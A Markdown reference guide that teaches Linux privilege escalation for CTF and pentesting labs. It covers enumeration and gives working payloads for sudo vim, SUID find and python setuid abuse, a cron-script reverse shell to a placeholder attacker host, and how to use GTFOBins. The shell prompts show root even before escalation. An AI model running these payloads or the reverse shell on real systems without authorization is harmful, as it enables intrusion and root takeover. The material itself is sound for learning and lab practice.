# Linux Privilege Escalation Techniques (Complete Guide)

> Practical CTF + pentesting Linux privilege escalation reference

---

## ✍️ Written by Aryan Giri

---

## ⚠️ Disclaimer

This content is for educational use only in authorized labs and CTF environments.

---

# 🧭 1. Initial Enumeration

Start with system recon.

```bash
root@ary_lap# uname -a
Linux ubuntu 5.15.0-91-generic x86_64 GNU/Linux
```

```bash
root@ary_lap# whoami
user
```

```bash
root@ary_lap# id
uid=1000(user) gid=1000(user)
```

```bash
root@ary_lap# cat /etc/os-release
Ubuntu 22.04 LTS
```

---

# 🔐 2. Sudo Misconfigurations

Check sudo permissions:

```bash
root@ary_lap# sudo -l
User user may run:
    (ALL) NOPASSWD: /usr/bin/vim
```

### Exploit example:

```bash
root@ary_lap# sudo vim -c ':!/bin/bash'
root@ary_lap# whoami
root
```

---

# 🧱 3. SUID Binaries

```bash
root@ary_lap# find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/find
/usr/bin/vim.basic
```

### Exploit example:

```bash
root@ary_lap# find . -exec /bin/bash -p \;
root@ary_lap# whoami
root
```

---

# ⚙️ 4. Linux Capabilities

```bash
root@ary_lap# getcap -r / 2>/dev/null
/usr/bin/python3 = cap_setuid+ep
```

```bash
root@ary_lap# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ary_lap# whoami
root
```

---

# ⏰ 5. Cron Jobs

```bash
root@ary_lap# cat /etc/crontab
* * * * * root /opt/backup.sh
```

If writable:

```bash
root@ary_lap# echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /opt/backup.sh
```

---

# 🧪 6. PATH Hijacking

```bash
root@ary_lap# echo $PATH
/usr/local/sbin:/usr/bin:/bin
```

Exploit idea: create malicious binary earlier in PATH.

---

# 🔥 7. GTFOBins (VERY IMPORTANT)

GTFOBins is a curated list of Unix binaries that can be abused for privilege escalation.

🔗 Website:
[https://gtfobins.github.io/](https://gtfobins.github.io/)

---

## 🧠 How to use GTFOBins effectively

### Step 1: Identify vulnerable binary

Example:

```bash
sudo -l
/usr/bin/vim
```

### Step 2: Search it on GTFOBins

Go to:

* [https://gtfobins.github.io/](https://gtfobins.github.io/)
* Search: `vim`

### Step 3: Choose context

GTFOBins shows multiple abuse methods:

* sudo abuse
* SUID abuse
* shell escape
* file read/write

### Step 4: Copy payload

Example from GTFOBins:

```bash
sudo vim -c ':!/bin/sh'
```

---

## 🧪 GTFOBins workflow in pentesting

```text
1. find binary (sudo -l / SUID / running service)
2. search on GTFOBins
3. check execution context (sudo? suid? capabilities?)
4. use matching payload
5. escalate to root
```

---

# 🧬 8. Kernel Exploits

```bash
root@ary_lap# uname -r
5.15.0-91-generic
```

Search exploit-db or local tools if outdated.

---

# 🧩 9. Weak File Permissions

```bash
root@ary_lap# find / -writable -type f 2>/dev/null
```

---

# 🧠 Final Mindset

Privilege escalation is about:

* Misconfigurations
* Weak permissions
* Reusable system binaries
* Human mistakes

---

## 🏁 End

Stay consistent with enumeration → always inspect everything.
